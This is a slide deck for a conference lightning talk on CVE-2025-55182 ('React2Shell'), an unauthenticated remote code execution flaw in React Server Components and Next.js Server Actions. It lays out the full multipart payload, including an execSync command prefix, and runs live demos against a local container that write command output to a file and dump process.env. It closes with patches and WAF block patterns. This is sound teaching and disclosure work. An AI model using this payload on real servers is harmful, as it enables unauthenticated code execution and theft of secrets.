---
title: React2Shell RCE Vulnerability
sub_title:  CVE-2025-55182
event: Vehikl Lightning Talks
date: 02-27-2026
author: Cole Foster
theme:
  name: catppuccin-mocha
options:
  end_slide_shorthand: true
---

Intro
===
# CVE-2025-55182 — **React2Shell**
### Unauthenticated RCE via Next.js Server Actions

```
Affects:   react-server-dom-webpack,           19.0, 19.1.0, 19.1.1, 19.2.0  
           react-server-dom-parcel, 
           react-server-dom-turbopack
        
           Next.js                             16.0.0 – 16.0.6
            
Vector:    Unauthenticated HTTP POST 
CVSS:      10.0 - Critical
Impact:    Full server-side code execution
```

---

JS Fundamentals: constructor chaining
===
## Every object leads to `Function`

```javascript +exec
const obj = {};
console.log("obj.constructor:              ", obj.constructor.name);
console.log("obj.constructor.constructor:  ", obj.constructor.constructor.name);
console.log("Same as Function?             ", obj.constructor.constructor === Function);
```

<!-- pause -->

`Function` takes a **string** and returns an executable function — it's `eval`:

```javascript +exec
const F = {}.constructor.constructor;

console.log("F('return 1+1')():",          F("return 1+1")());
console.log("F('return process.version')():", F("return process.version")());
```

<!-- pause -->

**Two property hops from any object → dynamic code execution.**

---

JS Fundamentals: thenables
===
## Duck-typed Promises

`await` doesn't check `instanceof Promise`.
Any object with a `.then` method is auto-called:

```javascript +exec
const sneaky = {
  then(resolve) {
    console.log("  .then() was called automatically!");
    resolve("done");
  }
};

Promise.resolve(sneaky).then(v => console.log("  resolved:", v));
```

<!-- pause -->

**Control `.then` on an object → control what `await` does.**

---

Context: Server Actions
===
## Server Actions

Server-side functions callable directly from the browser:

```typescript
"use server"
async function submitOrder(item: string, qty: number) {
  await db.insert({ item, qty })
  return { ok: true }
}
```

```tsx
<form action={submitOrder}>…</form>
```

<!-- pause -->

On submit the browser POSTs to **the page URL** (any route).
Next.js picks the function via an ID in the `Next-Action` header.
Arguments are serialized in React's **Flight** format.

---

Context: RSC Flight protocol
===
## RSC Flight — The Wire Format

```
POST /             HTTP/1.1
Next-Action:       <sha256-hash>          ← which function to call
Content-Type:      multipart/form-data
```

The body is numbered **chunks** with `$`-prefixed cross-references:

```
Field "0":  ["$1"]
Field "1":  {"item":"widget","vendor":"$2:vendorName"}
Field "2":  {"vendorName":"Vehikl"}
```

Resolves to: `[{item: "widget", vendor: "Vehikl"}]`

---

## Flight — How References Resolve

`$2:vendorName` → get chunk 2, access key `"vendorName"`:

```javascript +exec
// What the decoder does internally:
const chunks = {
  2: { vendorName: "Vehikl" }
};

const ref = "2:vendorName".split(":");     // ["2", "vendorName"]
let result = chunks[ref[0]];               // chunks[2]
for (let i = 1; i < ref.length; i++) {
  result = result[ref[i]];                 // result["vendorName"]
}
console.log("resolved:", result);
```

<!-- pause -->

The loop does `result = result[ref[i]]` — **raw bracket access, no validation.**

---

## Flight — The Bug

`"vendorName"` is an own property. But what about `"constructor"`?

```javascript +exec
const obj = { vendorName: "Vehikl" };

// Own property — normal
console.log("obj['vendorName']:", obj["vendorName"]);

// Inherited — walks the prototype chain
console.log("obj['constructor']:", obj["constructor"].name);
console.log("obj['constructor']['constructor']:", obj["constructor"]["constructor"].name);
```

<!-- pause -->

The decoder doesn't distinguish own vs inherited properties.

`$1:constructor:constructor` → `Function`. That's the entire bug.

---

## Live — Normal Request

```bash +exec
cat normal-request.hurl
```

<!-- pause -->

```bash +exec
hurl --variable host="${HOST:-http://localhost:3000}" \
     --no-color \
     normal-request.hurl 2>&1
```

_Expected failure — the action hash is fake. Server validated it before reading the body._

---

The Gadget Chain
===
## The Payload

Two multipart fields. No custom classes, no memory corruption.

```json
Field "0": {
  "then":      "$1:__proto__:then",
  "status":    "resolved_model",
  "reason":    -1,
  "value":     "{\"then\":\"$B0\"}",
  "_response": {
    "_prefix":   "<COMMAND>;//",
    "_formData": { "get": "$1:constructor:constructor" }
  }
}

Field "1": "$@0"
```

<!-- pause -->

**Field "1"**: `"$@0"` — self-reference back to chunk 0.
Gives the decoder a concrete object to traverse.

**Field "0"**: Mimics React's internal `Chunk` shape.

---

## Step 1 — Become a thenable

```
"then": "$1:__proto__:then"
```

```javascript +exec
// Simulating what the decoder does:
const chunk0 = { fake: true };

// $1 resolves to chunk0 itself (via the self-reference)
// Then walks: obj["__proto__"]["then"]
const resolved = chunk0["__proto__"];
console.log("__proto__:", resolved);
console.log("Has .then?", typeof resolved.then);
// In React, Chunk.prototype.then exists — so the object becomes a thenable.
// When the decoder awaits it → .then() fires automatically.
```

---

## Step 2 — Trick initialization

```
"status": "resolved_model"
```

`Chunk.prototype.then` checks `this.status`:

```javascript
// Inside Chunk.prototype.then (simplified):
if (this.status === "resolved_model") {
  initializeModelChunk(this);    // ← parses this.value using this._response
}
```

Our fake chunk has `status: "resolved_model"` →
React calls `initializeModelChunk` with **our object as `this`**.

It reads `this._response` — normally a trusted internal object.
Here it's attacker-controlled.

---

## Step 3 — Replace `_formData.get` with `Function`

```
"_formData": { "get": "$1:constructor:constructor" }
```

```javascript +exec
// The decoder resolves "$1:constructor:constructor":
const obj = {};
const path = ["1", "constructor", "constructor"];

let result = obj;                    // chunk 1 (any object)
result = result[path[1]];           // obj["constructor"] → Object
result = result[path[2]];           // Object["constructor"] → Function

console.log("_formData.get is now:", result.name);
console.log("Same as Function?", result === Function);
```

---

## Step 4 — Trigger via `$B`

```
"value":    "{\"then\":\"$B0\"}"
"_prefix":  "process.mainModule.require('child_process').execSync('id');//"
```

`$B` triggers the Blob handler, which calls:

```javascript
response._formData.get(response._prefix + 0)
```

With our substitutions:

```javascript +exec
const _prefix = "process.mainModule.require('child_process').execSync('id');//";
const id = 0;

// response._formData.get is Function, so:
const payload = _prefix + id;
console.log("Function('" + payload + "')");
console.log("The // comments out the trailing 0");

// Equivalent to:
// Function("process.mainModule.require('child_process').execSync('id');//0")()
// Which executes 'id' on the server.
```

---

## Attack Surface

Any `Next-Action` header (even nonsense) triggers deserialization.
The decoder runs **before** action ID validation, middleware, or auth.

```
POST /                          ← any route
Next-Action: doesntmatter       ← any value
Content-Type: multipart/form-data
```

No account. No CSRF token. No knowledge of the target app.

---

Live Demo
===

## Live — Step 1: Probe

```bash +exec
cat exploit-1-probe.hurl
```

<!-- pause -->

```bash +exec
hurl --variable host="${HOST:-http://localhost:3000}" \
     --no-color \
     exploit-1-probe.hurl 2>&1
```

---

## Live — Step 2: RCE

Write `id` output to `/tmp/pwned.txt` — runs **during deserialization**.

```bash +exec
cat exploit-2-rce.hurl
```

<!-- pause -->

```bash +exec
hurl --variable host="${HOST:-http://localhost:3000}" \
     --max-time 10 \
     --no-color \
     exploit-2-rce.hurl 2>&1
```

_500 — action not found. But `decodeReply()` already ran. The file is written._

<!-- pause -->

```bash +exec
docker exec react2shell-app cat /tmp/pwned.txt 2>&1 || echo "(adjust container name)"
```

---

## Live — Step 3: Dump `process.env`

```bash +exec
cat exploit-3-env-dump.hurl
```

<!-- pause -->

```bash +exec
hurl --variable host="${HOST:-http://localhost:3000}" \
     --max-time 10 \
     --no-color \
     exploit-3-env-dump.hurl 2>&1
```

<!-- pause -->

```bash +exec
docker exec react2shell-app cat /tmp/env_dump.json 2>&1 | head -20 || echo "(adjust container name)"
```

---

The Patch
===
## Fix 1 — Own-property check

```javascript
// BEFORE — walks prototype chain
for (let i = 1; i < path.length; i++) {
  parentObject = parentObject[path[i]];
}

// AFTER — blocks inherited properties
for (let i = 1; i < path.length; i++) {
  if (!Object.prototype.hasOwnProperty.call(parentObject, path[i])) {
    throw new Error("Invalid reference");
  }
  parentObject = parentObject[path[i]];
}
```

`$1:constructor:constructor` is dead — `"constructor"` isn't an own property.

---

## Fix 2 — Unforgeable response lookup

```javascript
// BEFORE — reads _response from the chunk object
value = reviveModel(chunk._response, ...);

// AFTER — uses a Symbol (cannot exist in JSON)
const RESPONSE_SYMBOL = Symbol("response");
const response = chunk.reason[RESPONSE_SYMBOL];
```

Fake chunks can never provide a fake `_response`.

<!-- pause -->

## Fix 3 — Type validation on `.then`

React now checks `typeof listener === "function"` before calling `.then()`.

<!-- pause -->

**Any single fix breaks the chain. The patch applied all three.**

---

Summary
===
## Summary

**3 requests. No auth. No account. No knowledge of the target app.**

<!-- pause -->

**Root cause** — the Flight decoder constructs objects from untrusted input:

```
obj[key]                           ← walks prototype chain unchecked
obj.constructor.constructor        ← always reaches Function
Function(string)                   ← eval with no imports or setup
await { then: fn }                 ← auto-calls .then() (duck-typed)
```

<!-- pause -->

**Remediation**

- ✅ Upgrade to **Next.js ≥ 16.0.7** / **React ≥ 19.1.0**
- ✅ WAF: block `__proto__` and `constructor:constructor` in POST bodies
- ✅ Runtime: deny `process.mainModule` access in server action context
